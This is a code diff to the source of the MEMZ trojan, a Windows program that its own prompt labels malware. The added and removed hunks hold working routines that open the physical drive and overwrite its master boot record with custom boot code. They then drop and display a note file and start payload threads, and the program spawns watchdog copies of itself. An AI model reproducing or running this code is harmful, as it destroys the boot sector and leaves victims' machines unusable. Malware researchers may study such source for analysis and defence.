@@ -32,6 +32,46 @@ void start() {
 				TranslateMessage(&msg);
 				DispatchMessage(&msg);
 			}
+		} else if(!lstrcmpW(argv[1], L"/main")) {	
+			HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+		
+			if (drive == INVALID_HANDLE_VALUE)
+				ExitProcess(2);
+	
+			unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
+		
+			// Join the two code parts together
+			int i = 0;
+			for (; i < mbrStage1Len; i++)
+				*(bootcode + i) = *(mbrStage1 + i);
+			for (i = 0; i < mbrStage2Len; i++)
+				*(bootcode + i + 0x1fe) = *(mbrStage2 + i);
+		
+			DWORD wb;
+			if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
+				ExitProcess(3);
+		
+			CloseHandle(drive);
+		
+			HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+		
+			if (note == INVALID_HANDLE_VALUE)
+				ExitProcess(4);
+		
+			if (!WriteFile(note, Note, NoteLen, &wb, NULL))
+				ExitProcess(5);
+		
+			CloseHandle(note);
+			ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
+		
+			for (int p = 0; p < nPayloads; p++) {
+				Sleep(payloads[p].startDelay);
+				CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
+			}
+		
+			for (;;) {
+				Sleep(10000);
+			}
 		}
 	} else {
 		// Another very ugly formatting
@@ -46,12 +86,12 @@ THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
 STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 			ExitProcess(0);
 		}
-
-		wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
-		GetModuleFileName(NULL, fn, 8192);
-
-		for (int i = 0; i < 5; i++)
-			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);
+	}
+	wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
+	GetModuleFileName(NULL, fn, 8192);
+	
+	for (int i = 0; i < 5; i++)
+		ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);
 
 		SHELLEXECUTEINFO info;
 		info.cbSize = sizeof(SHELLEXECUTEINFO);
@@ -70,45 +110,4 @@ STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
 
 		ExitProcess(0);
 	}
-
-	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-
-	if (drive == INVALID_HANDLE_VALUE)
-		ExitProcess(2);
-
-	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
-
-	// Join the two code parts together
-	int i = 0;
-	for (; i < mbrStage1Len; i++)
-		*(bootcode + i) = *(mbrStage1 + i);
-	for (i = 0; i < mbrStage2Len; i++)
-		*(bootcode + i + 0x1fe) = *(mbrStage2 + i);
-
-	DWORD wb;
-	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
-		ExitProcess(3);
-
-	CloseHandle(drive);
-
-	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-
-	if (note == INVALID_HANDLE_VALUE)
-		ExitProcess(4);
-
-	if (!WriteFile(note, Note, NoteLen, &wb, NULL))
-		ExitProcess(5);
-
-	CloseHandle(note);
-	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
-
-	for (int p = 0; p < nPayloads; p++) {
-		Sleep(payloads[p].startDelay);
-		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
-	}
-
-	for (;;) {
-		Sleep(10000);
-	}
-}
 #endif
